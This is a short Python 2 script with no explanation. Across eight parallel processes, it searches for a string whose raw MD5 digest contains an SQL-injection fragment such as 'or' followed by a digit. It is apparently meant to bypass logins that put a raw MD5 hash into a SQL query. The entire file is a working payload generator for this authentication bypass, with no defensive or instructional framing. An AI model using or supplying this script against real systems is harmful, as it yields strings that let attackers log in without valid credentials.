from hashlib import md5
from random import choice, randint
from string import ascii_lowercase, ascii_uppercase, digits
from multiprocessing import Process, Value
from ctypes import c_bool



def testHash(proid, charChoice, stop):
    # targets = ("'or'", "'Or'", "'oR'", "'OR'", "'||'")
    while 1:
        numChar = randint(4, 32)
        guess = ''.join(choice(charChoice) for _ in range(numChar))
        result = md5(guess).digest()

        stop.acquire()
        if stop.value:
            stop.release()
            break

        print proid

        if result.count("'") != 2:
            stop.release()
            continue

        for j in range(10):
            num = str(j)
            if result.find("'or'" + num) != -1:
                stop.value = True
                break
            elif result.find("'Or'" + num) != -1:
                stop.value = True
                break
            elif result.find("'oR'" + num) != -1:
                stop.value = True
                break
            elif result.find("'OR'" + num) != -1:
                stop.value = True
                break
            elif result.find("'||'" + num) != -1:
                stop.value = True
                break

        if stop.value:
            print proid, guess
            print proid, result
            stop.release()
            break

        stop.release()


if __name__ == '__main__':
    charChoice = ascii_lowercase + ascii_uppercase + digits
    #charChoice = digits
    stop = Value(c_bool, False)
    numProcess = 8
    processes = [Process(target=testHash, args=(i, charChoice, stop)) for i in range(numProcess)]
    for i in range(numProcess):
        processes[i].start()

    for i in range(numProcess):
        processes[i].join()

